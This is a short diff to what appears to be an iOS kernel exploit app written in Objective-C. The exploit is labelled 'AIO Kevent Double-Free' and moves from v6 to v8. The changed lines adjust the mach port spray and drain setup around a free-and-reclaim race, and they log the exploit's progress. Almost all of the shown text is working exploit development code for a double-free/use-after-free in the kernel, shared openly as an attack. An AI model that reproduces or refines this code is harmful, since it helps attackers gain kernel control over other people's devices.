@@ -3667,7 +3667,6 @@ static void *aio_free_and_reclaim_racer(void *arg) {
     mach_port_t sprayPort = MACH_PORT_NULL;
     __block int sprayReady = 0;
     if (mach_port_allocate(mach_task_self_, MACH_PORT_RIGHT_RECEIVE, &sprayPort) == KERN_SUCCESS) {
-        mach_port_insert_right(mach_task_self_, sprayPort, sprayPort, MACH_MSG_TYPE_MAKE_SEND);
         sprayReady = 1;
     }
     [self appendLog:[NSString stringWithFormat:@"  Spray port: %@", sprayReady ? @"OK" : @"FAILED"]];
@@ -5670,7 +5669,7 @@ static int _aioUafRunning = 0;
         _aioUafRunning = 1;
     }
 
-    [self appendLog:@"\n========== AIO Kevent Double-Free v6 =========="];
+    [self appendLog:@"\n========== AIO Kevent Double-Free v8 =========="];
 
     // Disable button to prevent double-tap
     dispatch_async(dispatch_get_main_queue(), ^{
@@ -5863,13 +5862,12 @@ static int _aioUafRunning = 0;
     for (int p = 0; p < kDrainPorts; p++) {
         drainPorts[p] = MACH_PORT_NULL;
         if (mach_port_allocate(mach_task_self_, MACH_PORT_RIGHT_RECEIVE, &drainPorts[p]) == KERN_SUCCESS) {
-            mach_port_insert_right(mach_task_self_, drainPorts[p], drainPorts[p], MACH_MSG_TYPE_MAKE_SEND);
             drainPortsReady++;
         }
     }
     // Dedicated port for overlap spray — only gets 1 drain msg → 1+1=2 < 5
-    if (mach_port_allocate(mach_task_self_, MACH_PORT_RIGHT_RECEIVE, &overlapPort) == KERN_SUCCESS) {
-        mach_port_insert_right(mach_task_self_, overlapPort, overlapPort, MACH_MSG_TYPE_MAKE_SEND);
+    if (mach_port_allocate(mach_task_self_, MACH_PORT_RIGHT_RECEIVE, &overlapPort) != KERN_SUCCESS) {
+        overlapPort = MACH_PORT_NULL;
     }
     [self appendLog:[NSString stringWithFormat:@"  Drain ports: %d/%d ready", drainPortsReady, kDrainPorts]];
 
